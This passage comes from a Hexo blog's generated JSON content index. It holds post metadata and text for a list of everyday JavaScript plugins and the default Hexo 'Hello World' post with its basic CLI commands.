class=&quot;post-count&quot;&gt;&lt;%= wordcount(post.content) %&gt;&lt;/span&gt; Post Minutes to Read:1&lt;span class=&quot;post-count&quot;&gt;&lt;%= min2read(post.content) %&gt;&lt;/span&gt; Total Count:1&lt;span class=&quot;post-count&quot;&gt;&lt;%= totalcount(site) %&gt;&lt;/span&gt; hexo-generator-json-content","categories":[{"name":"plugins","slug":"plugins","permalink":"https://jiuylq.github.io/categories/plugins/"}],"tags":[{"name":"plugins","slug":"plugins","permalink":"https://jiuylq.github.io/tags/plugins/"}]},{"title":"js-plugins","slug":"plugins","date":"2017-10-30T14:35:37.000Z","updated":"2017-11-05T14:35:27.250Z","comments":true,"path":"2017/10/30/plugins/","link":"","permalink":"https://jiuylq.github.io/2017/10/30/plugins/","excerpt":"日常中常用到的js plugins。","text":"日常中常用到的js plugins。 plugins https://github.com/jawil/blog/issues/10pdf.js PDF.js is a Portable Document Format (PDF) viewer that is built with HTML5 github highlight.jsHighlight.js is a syntax highlighter written in JavaScript. It works in the browser as well as on the server. It works with pretty much any markup, doesn’t depend on any framework and has automatic language detection.github clipboard.jsA modern approach to copy text to clipboardgithub 官网 cropperjsJavaScript image croppergithub Lazy Loading Echo简单易用的图片延迟加载插件github 官方 Lazyr.js延迟加载图片（Lazy Loading）github 官方 better-scroll.js小巧，灵活的 JavaScript 模拟滚动条的插件github 官方 better-picker一款轻量级IOS风格的JavaScript选择器github 官方","categories":[{"name":"plugins","slug":"plugins","permalink":"https://jiuylq.github.io/categories/plugins/"}],"tags":[{"name":"plugins","slug":"plugins","permalink":"https://jiuylq.github.io/tags/plugins/"}]},{"title":"Hello World","slug":"hello-world","date":"2017-07-07T07:51:28.000Z","updated":"2019-04-07T04:20:44.648Z","comments":true,"path":"2017/07/07/hello-world/","link":"","permalink":"https://jiuylq.github.io/2017/07/07/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}